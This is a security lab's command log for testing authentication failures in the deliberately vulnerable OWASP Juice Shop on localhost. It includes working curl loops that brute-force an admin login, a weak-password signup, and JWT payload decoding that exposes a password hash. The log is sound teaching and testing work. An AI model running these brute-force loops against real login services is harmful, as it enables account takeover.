# Commands Log — OWASP A07: Identification and Authentication Failures (Juice Shop)

## Setup
cd ~/Alrazzaq_Labs/OWASP-Top-10
mkdir -p 07-Auth-Failures/raw-output 07-Auth-Failures/screenshots
cd 07-Auth-Failures
touch README.md commands.md findings.md methodology.md remediation.md

## Baseline: repeated failed logins against a known account
for i in {1..10}; do
  curl -s -o /dev/null -w "Attempt $i: %{http_code}\n" -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrongpassword'"$i"'"}'
done
# Result: 10/10 attempts returned 401, no throttling observed

## Escalated test: 30 attempts, capture headers, measure wall-clock time
time (for i in {1..30}; do
  curl -s -D - -o /dev/null -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrongpassword'"$i"'"}' \
  | grep -iE "HTTP/|ratelimit|retry-after"
done) 2>&1 | tee raw-output/bruteforce_30_attempts.txt
# Result: 30/30 attempts returned 401 in 1.25s total wall time; no 429s;
# no X-RateLimit-* or Retry-After headers observed at any point
# (notable given "express-rate-limit" is present in the app's own dependency tree - A06)

## Weak password policy check
curl -s -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"weakpass@test.com","password":"a","passwordRepeat":"a"}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/weak_password_attempt.json
cat raw-output/weak_password_attempt.json
# Result: 201 Created - single-character password accepted, no complexity enforcement

## Session/logout invalidation check
curl -s http://localhost:3000/rest/user/logout \
  -H "Authorization: Bearer $TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 500 - "/rest/user/logout" is not a real server route (Angular-side-only misroute,
# same pattern seen in A04); confirms there is no server-side logout endpoint at all

## Fresh login + token expiry/content inspection
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"vulncheck@test.com","password":"Testing123!"}' \
  -o raw-output/session_test_login.json

export TOKEN=$(cat raw-output/session_test_login.json | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
echo "TOKEN: $TOKEN"

curl -s http://localhost:3000/rest/basket/26 \
  -H "Authorization: Bearer $TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 200 - token confirmed valid and working

python3 -c "
import base64, json
payload = '$TOKEN'.split('.')[1]
payload += '=' * (-len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(payload))
print(json.dumps(data, indent=2))
"
# Result: payload contains only 'iat' (issued-at), no 'exp' (expiration) claim at all;
# payload also embeds the user's password hash directly:
# "password": "b8f58c3067916bbfb50766aa8bddd42c" (unsalted MD5-length hash, ties to A02 findings)
